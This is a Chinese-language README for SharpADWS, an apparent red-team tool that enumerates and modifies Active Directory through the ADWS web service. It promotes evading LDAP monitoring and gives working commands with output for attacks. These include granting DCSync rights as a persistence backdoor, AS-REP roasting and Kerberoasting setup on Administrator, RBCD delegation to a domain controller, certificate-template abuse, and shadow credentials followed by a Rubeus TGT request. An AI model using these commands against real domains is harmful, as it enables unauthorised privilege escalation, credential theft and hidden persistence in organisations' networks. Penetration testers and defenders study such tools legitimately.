# SharpADWS

## 概述

SharpADWS 是一个为 Red Teams 打造的 Active Directory 侦查和利用工具，其通过 Active Directory Web Services (ADWS) 协议收集并修改 Active Directory 数据。

通常情况下，枚举或操作 Active Directory 是通过 LDAP 协议进行的。SharpADWS 能够在不直接与 LDAP 服务器通信的情况下提取或修改 Active Directory 数据。在 ADWS 下，LDAP 查询被包装在一系列 SOAP 消息中，然后使用 NET TCP Binding 加密信道将它们发送到 ADWS 服务器。随后，ADWS 服务器在其本地解包 LDAP 查询并将其转发到运行在同一域控制器上的 LDAP 服务器。

在安装 Active Directory Domain Services (ADDS) 后，Active Directory Web Services (ADWS) 将自动开启，因此 SharpADWS 在所有域环境中具备通用型。

## 优点

使用 ADWS 进行 LDAP 后利用的主要好处之一是它相对不为人所知，由于 LDAP 流量不会通过网络发送，因此不容易被常见的监控工具检测到。ADWS 运行与 LDAP 完全不同的服务，可在 TCP 端口 9389 上使用，并使用 SOAP 协议作为其接口。

在研究 ADWS 时，我们注意到，由于它是 SOAP Web 服务，因此实际执行的 LDAP 查询是在域控制器本地完成的。这提供了许多有趣的副作用，结果证明是有利的。比如，在分析域控制器上的 LDAP 查询时，您可能会注意到查询源自 127.0.0.1日志，在许多情况下它们将被忽视。

这样做的第二个好处是该活动不会显示在 LDAPSearch 操作类型下的 DeviceEvents 中，这意味着可用的遥测数据非常少。

## 协议实现

SharpADWS 实现了 [MS-ADDM](https://learn.microsoft.com/zh-cn/openspecs/windows_protocols/ms-addm/af3eb9be-b407-4423-a707-387fedbbaf1d)、[MS-WSTIM](https://learn.microsoft.com/zh-cn/openspecs/windows_protocols/ms-wstim/08164681-df91-49bd-a0ea-ce949d1cc536) 和 [MS-WSDS](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsds/2ded136c-2fe2-4f7d-8d09-a7118815c6bb) 协议的相关细节，您可以借助该项目的源码，轻松实现对 Active Directory Web Services 的以下操作：

- Enumerate：创建与指定的搜索查询过滤器相映射的上下文。
- Pull：在特定枚举的上下文中检索结果对象。 
- Renew：更新指定枚举上下文的过期时间。  
- GetStatus：获取指定枚举上下文的过期时间。
- Release：释放指定的枚举上下文。  
- Delete：删除现有的对象。
- Get：从对象中检索一个或多个属性。
- Put：修改对象上的一个或多个属性的内容。
  - Add：将指定的属性值添加到指定属性的值集中，如果目标对象上尚不存在该属性，则创建该属性。
  - Replace：用操作中指定的值替换指定属性中的值集，如果目标对象上尚不存在该属性，则创建该属性。如果操作中没有指定值，则将删除当前指定属性上的所有值。
  - Delete：从指定的属性中删除指定的属性值。如果没有指定值，则将删除所有值。如果目标对象上不存在指定的属性，则 PUT 请求失败。
- Create：创建一个新的对象。

## 工具使用

命令行参数 `-h` 可用于显示以下使用信息：

```cmd
C:\Users\Marcus>SharpADWS.exe -h

SharpADWS 1.0.0-beta - Copyright (c) 2024 WHOAMI (whoamianony.top)

  -h                      Display this help screen

Connection options:
  -d                      Specify domain for enumeration
  -u                      Username to use for ADWS Connection
  -p                      Password to use for ADWS Connection

Supported methods:
  Cache                   Dump all objectSids to cache file for Acl methods
  Acl                     Enumerate and analyze DACLs for specified objects, specifically Users, Computers, Groups, Domains, DomainControllers and GPOs
  DCSync                  Enumerate all DCSync-capable accounts and can set DCSync backdoors
  DontReqPreAuth          Enumerates all accounts that do not require kerberos preauthentication, and can enable this option for accounts
  Kerberoastable          Enumerates all Kerberoastable accounts, and can write SPNs for accounts
  AddComputer             Add a machine account within the scope of ms-DS-MachineAccountQuota for RBCD attack
  RBCD                    Read, write and remove msDS-AllowedToActOnBehalfOfOtherIdentity attributes for Resource-Based Constrained Delegation attack
  Certify                 Enumerate all ADCS data like Certify.exe, and can write template attributes
  Whisker                 List, add and remove msDS-KeyCredentialLink attribute like Whisker.exe for ShadowCredentials attack
  FindDelegation          Enumerate all delegation relationships for the target domain

Acl options:
  -dn                     RFC 2253 DN to base search from
  -scope                  Set your Scope, support Base (Default), Onelevel, Subtree
  -trustee                The sAMAccountName of a security principal to check for its effective permissions
  -right                  Filter DACL for a specific AD rights
  -rid                    Specify a rid value and filter out DACL that security principal's rid is greater than it
  -user                   Enumerate DACL for all user objects
  -computer               Enumerate DACL for all computer objects
  -group                  Enumerate DACL for all group objects
  -domain                 Enumerate DACL for all domain objects
  -domaincontroller       Enumerate DACL for all domain controller objects
  -gpo                    Enumerate DACL for all gpo objects

DCSync options:
  -action [{list, write}] Action to operate on DCSync method
          list            List all accounts with DCSync permissions
          write           Escalate accounts with DCSync permissions
  -target                 Specify the sAMAccountName of the account

DontReqPreAuth options:
  -action [{list, write}] Action to operate on DontReqPreAuth method
          list            List all accounts that do not require kerberos preauthentication
          write           Enable do not require kerberos preauthentication for an account
  -target                 Specify the sAMAccountName of the account

Kerberoastable options:
  -action [{list, write}] Action to operate on Kerberoastable method
          list            List all kerberoastable accounts
          write           Write SPNs for an account to kerberoast
  -target                 Specify the sAMAccountName of the account

AddComputer options:
  -computer-name          Name of computer to add, without '$' suffix
  -computer-pass          Password to set for the computer

RBCD options:
  -action [{read,write,remove}]
                          Action to operate on RBCD method
          read            Read the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of the account
          write           Write the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of the account
          remove          Remove the msDS-AllowedToActOnBehalfOfOtherIdentity attribute value of the account added by the write action

Certify options:
  -action [{find, modify}]
                          Action to operate on Certify method
          find            Find all CA and certificate templates
          modify          Modify certificate templates
  -enrolleeSuppliesSubject
                          Enumerate certificate templates with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag for find action,
                          and can enable CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag for modify action
  -clientAuth             Enumerate certificate templates with client authentication pKIExtendedKeyUsage for find action,
                          and can enable Client Authentication for modify action

Whisker options:
  -action [{list, add, remove}]
                          Action to operate on ShadowCredentials method
          list            List all the values of the msDS-KeyCredentialLink attribute for an account
          add             Add a new value to the msDS-KeyCredentialLink attribute for an account
          remove          Remove a value from the msDS-KeyCredentialLink attribute for an account
  -device-id              Specify the DeviceID to remove
  -target                 Specify the sAMAccountName of the account

FindDelegation options:
  No options, just run!
  
```

### Cache

SharpADWS 在枚举 ACL 时，为了不对每个未知的受托者对象执行额外的 ADWS 请求，需要提前通过 cache method 创建所有账户对象的完整缓存并将其保存到文件中，从而避免产生大量（不必要的）流量。该缓存包含当前域内每个账户对象名称与其 objectSid 的映射。

```cmd
C:\Users\Marcus>SharpADWS.exe Cache

[*] Cache file has been generated: object.cache

```

### Acl

Acl method 能够枚举指定 `-dn` 的对象的 DACL，并且支持通过 `-trustee`、`-right` 和 `-rid` 参数对枚举出的 DACL 进行筛选。比如，我们要枚举所有的 Domain Controller 对象，并筛选出受托者为 Marcus 的 DACL，如下所示：

```cmd
C:\Users\Marcus>SharpADWS.exe acl -dn "OU=Domain Controllers,DC=corp,DC=local" -scope Subtree -trustee Marcus

 Severity              : Critical
 ObjectDN              : CN=DC01,OU=Domain Controllers,DC=corp,DC=local
 AccessControlType     : Allow
 ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
 ObjectType            : All
 Trustee               : Marcus
 IsInherited           : False
 
```

又比如，我们要枚举所有的 User 对象，并筛选出权限为 GenericWrite，受托者的 RID 大于 1000 的 DACL，如下所示：

```cmd
C:\Users\Marcus>SharpADWS.exe acl -dn "CN=Users,DC=corp,DC=local" -scope Subtree -right Generic -rid 1000

 Severity              : Critical
 ObjectDN              : CN=Bob,CN=Users,DC=corp,DC=local
 AccessControlType     : Allow
 ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
 ObjectType            : All
 Trustee               : Marcus
 IsInherited           : False

```

此外，Acl method 还支持对特定对象的枚举：

```cmd
SharpADWS.exe -user                # Enumerate DACL for all user objects
SharpADWS.exe -computer            # Enumerate DACL for all computer objects
SharpADWS.exe -group               # Enumerate DACL for all group objects
SharpADWS.exe -domain              # Enumerate DACL for all domain objects
SharpADWS.exe -domaincontroller    # Enumerate DACL for all domain controller objects
SharpADWS.exe -gpo                 # Enumerate DACL for all gpo objects
```

**需要注意的是，Acl Method 的使用必须依赖于已经通过 Cache Method 建立的映射缓存。**

### DCSync

DCSync method 的 `list` 能够查询出所有被授予了 DS-Replication-Get-Changes、DS-Replication-Get-Changes-All 和 DS-Replication-Get-Changes-In-Filtered-Set 权限的账户，如下所示：

```cmd
C:\Users\Marcus>SharpADWS.exe DCSync -action list

 Severity              : Info
 ObjectDN              : DC=corp,DC=local
 AccessControlType     : Allow
 ActiveDirectoryRights : ExtendedRight
 ObjectType            : DS-Replication-Get-Changes-All
 Trustee               : Administrators
 IsInherited           : False

 Severity              : Info
 ObjectDN              : DC=corp,DC=local
 AccessControlType     : Allow
 ActiveDirectoryRights : ExtendedRight
 ObjectType            : DS-Replication-Get-Changes-All
 Trustee               : Domain Controllers
 IsInherited           : False

 Severity              : Critical
 ObjectDN              : DC=corp,DC=local
 AccessControlType     : Allow
 ActiveDirectoryRights : ExtendedRight
 ObjectType            : DS-Replication-Get-Changes-All
 Trustee               : Alice
 IsInherited           : False
 
```

**需要注意的是，DCSync Method 的 `list` 必须依赖于已经通过 Cache Method 建立的映射缓存。**

此外，在拥有足够权限的情况下，您可以通过 `write` 为某个账户授予 DCSync 权限，以建立域持久性后门：

```cmd
C:\Users\Marcus>SharpADWS.exe DCSync -action write -target Marcus

[*] Account Marcus now has DCSync privieges on the domain.

```

### DontReqPreAuth

DontReqPreAuth method 的 `list` 能够查找出所有设置了 “Do not require kerberos preauthentication” 选项的账户，如下所示：

```cmd
C:\Users\Marcus>SharpADWS.exe DontReqPreAuth -action list

[*] Found users that do not require kerberos preauthentication:
[*]     CN=Bob,CN=Users,DC=corp,DC=local
[*]     CN=Alice,CN=Users,DC=corp,DC=local
[*]     CN=John,CN=Users,DC=corp,DC=local

```

此外，您可以滥用对目标账户 userAccountControl 属性的 WriteProperty 权限，通过  `write` 为该账户启用 “Do not require kerberos preauthentication”  选项，以执行 AS-REP Roasting 攻击：

```cmd
C:\Users\Marcus>SharpADWS.exe DontReqPreAuth -action write -target Administrator

[*] Set DontReqPreAuth for user Administrator successfully!

```

### Kerberoastable

Kerberoastable method 的 `list` 能够查找出所有设置了 SPN 的账户，如下所示：

```cmd
C:\Users\Marcus>SharpADWS.exe Kerberoastable -action list

[*] Found kerberoastable users:
[*] CN=krbtgt,CN=Users,DC=corp,DC=local
[*]     kadmin/changepw
[*] CN=Bob,CN=Users,DC=corp,DC=local
[*]     WWW/win-iisserver.corp.local/IIS
[*]     TERMSERV/win-iisserver.corp.local
[*] CN=John,CN=Users,DC=corp,DC=local
[*]     TERMSERV/WIN-SERVER2026

```

此外，您可以滥用对目标账户 servicePrincipalName 属性的 WriteProperty 权限，通过  `write` 为该账户（仅限于用户账户）添加一个 SPN，以执行 Kerberoasting 攻击：

```cmd
C:\Users\Marcus>SharpADWS.exe Kerberoastable -action write -target Administrator

[*] Kerberoast user Administrator successfully!

```

### AddComputer

AddComputer method 允许您在 ms-DS-MachineAccountQuota 属性值限制的范围内创建一个新的计算机账户，该极其账户可用于后续的 RBCD 攻击中使用。

```cmd
C:\Users\Marcus>SharpADWS.exe AddComputer -computer-name PENTEST$ -computer-pass Passw0rd

[*] Successfully added machine account PENTEST$ with password Passw0rd.

```

### RBCD

RBCD method 的 `read` 能够读取指定账户对象的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性值，以检查谁有权限对该账户进行资源委派，如下所示：

```cmd
C:\Users\Marcus>SharpADWS.exe RBCD -action read -delegate-to DC01$

[*] Accounts allowed to act on behalf of other identity:
[*]     WIN-IISSERVER$    (S-1-5-21-1315326963-2851134370-1073178800-1106)
[*]     WIN-MSSQL$    (S-1-5-21-1315326963-2851134370-1073178800-1103)
[*]     WIN-PC8087$    (S-1-5-21-1315326963-2851134370-1073178800-1117)

```

RBCD method 的 `write` 能够写入目标账户对象的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性，以进行 Resource-Based Constrained Delegation 攻击。如下所示，我们首先用 AddComputer method 创建了一个新的极其账户 `PENTEST$`，然后我们可以执行以下命令，将 `PENTEST$` 的 SID 写入 `DC01$` 的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性中：

```cmd
C:\Users\Marcus>SharpADWS.exe RBCD -action write -delegate-to DC01$ -delegate-from PENTEST$

[*] Delegation rights modified successfully!
[*] PENTEST$ can now impersonate users on DC01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     PENTEST$    (S-1-5-21-1315326963-2851134370-1073178800-1113)

```

此外，通过 `remove` 可以将 `write` 中添加的 SID 从目标对象的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性中移除：

```cmd
C:\Users\Marcus>SharpADWS.exe RBCD -action remove -delegate-to DC01$ -delegate-from PENTEST$

[*] Delegation rights modified successfully!
[*] Accounts allowed to act on behalf of other identity has been removed:
[*]     PENTEST$    (S-1-5-21-1315326963-2851134370-1073178800-1113)

```

### Certify

Certify method 的 `find` 能够像 [Certify](https://github.com/GhostPack/Certify) 一样枚举 ADCS 中的数据，包括所有的证书颁发机构和证书模版：

```cmd
C:\Users\Marcus>SharpADWS.exe Certify -action find

[*] Find CA and certificate templates
[*] Using the search base 'CN=Configuration,DC=corp,DC=local'
[*] Listing info about the Enterprise CA 'corp-DC01-CA'

    Enterprise CA Name              : corp-DC01-CA
    DNS Name                        : DC01.corp.local
    FullName                        : DC01.corp.local\corp-DC01-CA
    Certificate Subject             : CN=corp-DC01-CA, DC=corp, DC=local
    Certificate Serial Number       : 2D975C2D49AE4BB7432682E1708C8834
    Certificate Validity Start      : 2/13/2024 5:55:36 PM
    Certificate Validity End        : 2/13/2029 6:05:36 PM
    CA Permissions                  :
         Enrollment Rights          :
                                    : Authenticated Users
         Object Control Permissions :
             ManageCA               :
                                    : Enterprise Admins
                                    : DC01
                                    : Domain Admins
             ManageCertificates     :
                                    : Enterprise Admins
                                    : DC01
             WriteDacl              :
                                    : Enterprise Admins
                                    : DC01
                                    : Domain Admins
             WriteOwner             :
                                    : Enterprise Admins
                                    : DC01
                                    : Domain Admins
             WriteProperty          :
                                    : Enterprise Admins
                                    : DC01
                                    : Domain Admins

[*] Available Certificates Templates

    CA Name                         : CORP-DC01-CA
    Template Name                   : User
    Enabled                         : True
    Client Authentication           : True
    Enrollment Agent                : False
    Any Purpose                     : False
    Enrollee Supplies Subject       : False
    pKIExtendedKeyUsage             : Encrypting File System  Secure Email  Client Authentication
    msPKI-Certificate-Name-Flag     : SUBJECT_ALT_REQUIRE_UPN  SUBJECT_ALT_REQUIRE_EMAIL  SUBJECT_REQUIRE_EMAIL  SUBJECT_REQUIRE_DIRECTORY_PATH
    msPkI-Enrollment-Flag           : INCLUDE_SYMMETRIC_ALGORITHMS  PUBLISH_TO_DS  AUTO_ENROLLMENT
    msPKI-Private-Key-Flag          : EXPORTABLE_KEY
    CA Permissions                  :
         Enrollment Rights          :
                                    : Domain Admins
                                    : Domain Users
                                    : Enterprise Admins
         Object Control Permissions :
             WriteDacl              :
                                    : Domain Admins
                                    : Enterprise Admins
             WriteOwner             :
                                    : Domain Admins
                                    : Enterprise Admins
             WriteProperty          :
                                    : Domain Admins
                                    : Enterprise Admins
                                    : Domain Users

    CA Name                         :
    Template Name                   : UserSignature
    Enabled                         : False
    Client Authentication           : True
    Enrollment Agent                : False
    Any Purpose                     : False
    Enrollee Supplies Subject       : False
    pKIExtendedKeyUsage             : Secure Email  Client Authentication
    msPKI-Certificate-Name-Flag     : SUBJECT_ALT_REQUIRE_UPN  SUBJECT_ALT_REQUIRE_EMAIL  SUBJECT_REQUIRE_EMAIL  SUBJECT_REQUIRE_DIRECTORY_PATH
    msPkI-Enrollment-Flag           : AUTO_ENROLLMENT
    msPKI-Private-Key-Flag          : ATTEST_NONE
    CA Permissions                  :
         Enrollment Rights          :
                                    : Domain Admins
                                    : Domain Users
                                    : Enterprise Admins
         Object Control Permissions :
             WriteDacl              :
                                    : Domain Admins
                                    : Enterprise Admins
             WriteOwner             :
                                    : Domain Admins
                                    : Enterprise Admins
             WriteProperty          :
                                    : Domain Admins
                                    : Enterprise Admins
                                    : Domain Users

# ...
```

此外， `find` 支持 `-enrolleeSuppliesSubject` 和 `-clientAuth` 选项，能够筛选出所有开启了 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志和支持 Client Authentication 的证书模版：

```cmd
C:\Users\Marcus>SharpADWS.exe Certify -action find -enrolleeSuppliesSubject -clientAuth

[*] Find CA and certificate templates
[*] Using the search base 'CN=Configuration,DC=corp,DC=local'
[*] Listing info about the Enterprise CA 'corp-DC01-CA'

    # ...

[*] Available Certificates Templates

    CA Name                         : CORP-DC01-CA
    Template Name                   : User
    Enabled                         : True
    Client Authentication           : True
    Enrollment Agent                : False
    Any Purpose                     : False
    Enrollee Supplies Subject       : True
    pKIExtendedKeyUsage             : Encrypting File System  Secure Email  Client Authentication
    msPKI-Certificate-Name-Flag     : ENROLLEE_SUPPLIES_SUBJECT  SUBJECT_ALT_REQUIRE_UPN  SUBJECT_ALT_REQUIRE_EMAIL  SUBJECT_REQUIRE_EMAIL  SUBJECT_REQUIRE_DIRECTORY_PATH
    msPkI-Enrollment-Flag           : INCLUDE_SYMMETRIC_ALGORITHMS  PUBLISH_TO_DS  AUTO_ENROLLMENT
    msPKI-Private-Key-Flag          : EXPORTABLE_KEY
    CA Permissions                  :
         Enrollment Rights          :
                                    : Domain Admins
                                    : Domain Users
                                    : Enterprise Admins
         Object Control Permissions :
             WriteDacl              :
                                    : Domain Admins
                                    : Enterprise Admins
             WriteOwner             :
                                    : Domain Admins
                                    : Enterprise Admins
             WriteProperty          :
                                    : Domain Admins
                                    : Enterprise Admins
                                    : Marcus
                                    : Domain Users
                                    
# ...
```
**需要注意的是，Certify Method 的 `find` 必须依赖于已经通过 Cache Method 建立的映射缓存。**

Certify method 的 `modify` 允许您在拥有对目标模版的写入权限下，修改证书模版的属性，例如开启 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志或启用 Client Authentication：

```cmd
C:\Users\Marcus>SharpADWS.exe Certify -action modify -template User -enrolleeSuppliesSubject -clientAuth

[*] Enable enrollee supplies subject for template User successfully!
[*] Enable client authentication for template User successfully!

```

### Whisker

Whisker method 能够像 [Whisker](https://github.com/eladshamir/Whisker) 一样执行 ShadowCredentials 攻击的生命周期。

Whisker method 的 `list` 能够列出目标账户对象的 `msDS-KeyCredentialLink` 属性值：

```cmd
C:\Users\Marcus>SharpADWS.exe Whisker -action list -target DC01$

[*] List deviced for DC01$:
[*]     DeviceID: c9fdae6b-f6a1-4880-a498-6dc89814e596    Creation Time: 2/13/2024 7:43:49 PM
[*]     DeviceID: ee48b31f-71b1-4821-b21e-1ca28fad2ae9    Creation Time: 2/13/2024 8:06:52 PM
[*]     DeviceID: 80c31faf-8b0b-4af6-8350-22de2d91a4fd    Creation Time: 2/13/2024 8:01:50 PM

```

Whisker method 的 `add` 允许您在拥有写入权限的情况下，为目标账户的 `msDS-KeyCredentialLink` 属性添加一个 Key，以执行 ShadowCredentials 攻击：

```cmd
C:\Users\Marcus>SharpADWS.exe Whisker -action add -target Administrator -cert-pass Passw0rd

[*] Certificate generaged
[*] KeyCredential generated with DeviceID 7d9e0151-5fd2-46d5-ac3d-dce8a71399f2
[*] Updated the msDS-KeyCredentialLink attribute successfully!
[*] You can now run Rubeus with the following syntax:

      Rubeus.exe asktgt /user:Administrator /certificate:MIIJzwIBAzCCCYsGCSqGSIb3DQEHA
      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 /password:"Passw0rd" /domain:cor
      p.local /getcredentials /show

```

此外，通过 `remove`，您可以提供 `-device-id` 将指定的 Key 从目标对象的 `msDS-KeyCredentialLink` 属性中移除：

```cmd
C:\Users\Marcus>SharpADWS.exe Whisker -action remove -target DC01$ -device-id c9fdae6b-f6a1-4880-a498-6dc89814e596

[*] Found value to remove
[*] msDS-KeyCredentialLink value has been removed:
[*]     DeviceID: c9fdae6b-f6a1-4880-a498-6dc89814e596    Creation Time: 2/13/2024 7:43:49 PM

```

### FindDelegation

FindDelegation method 能够枚举出当前域内所有的委派关系，该 method 没有多余的选项或参数：

```cmd
C:\Users\Marcus\desktop>SharpADWS.exe FindDelegation

AccountName  AccountType  DelegationType                      DelegationRightsTo
-----------  -----------  ----------------------------------  ----------------------------------------------
DC01$        Computer     Unconstrained                       N/A
PENTEST$     Computer     Resource-Based Constrained          DC01$
WIN-MSSQL$   Computer     Constrained w/ Protocol Transition  ldap/DC01.corp.local/corp.local
WIN-MSSQL$   Computer     Constrained w/ Protocol Transition  ldap/DC01.corp.local
WIN-MSSQL$   Computer     Constrained w/ Protocol Transition  ldap/DC01
WIN-MSSQL$   Computer     Constrained w/ Protocol Transition  ldap/DC01.corp.local/CORP
WIN-MSSQL$   Computer     Constrained w/ Protocol Transition  ldap/DC01/CORP
WIN-MSSQL$   Computer     Constrained w/ Protocol Transition  ldap/DC01.corp.local/DomainDnsZones.corp.local
WIN-MSSQL$   Computer     Constrained w/ Protocol Transition  ldap/DC01.corp.local/ForestDnsZones.corp.local
WIN-PC8087$  Computer     Constrained w/ Protocol Transition  cifs/DC01.corp.local/corp.local
WIN-PC8087$  Computer     Constrained w/ Protocol Transition  cifs/DC01.corp.local
WIN-PC8087$  Computer     Constrained w/ Protocol Transition  cifs/DC01
WIN-PC8087$  Computer     Constrained w/ Protocol Transition  cifs/DC01.corp.local/CORP
WIN-PC8087$  Computer     Constrained w/ Protocol Transition  cifs/DC01/CORP

```

## 说在最后

该项目由我独立完成，难免会存在一些 Bug。非常欢迎各位贡献者提交 issue 报告 bug 或提出新点子，共同完善项目！
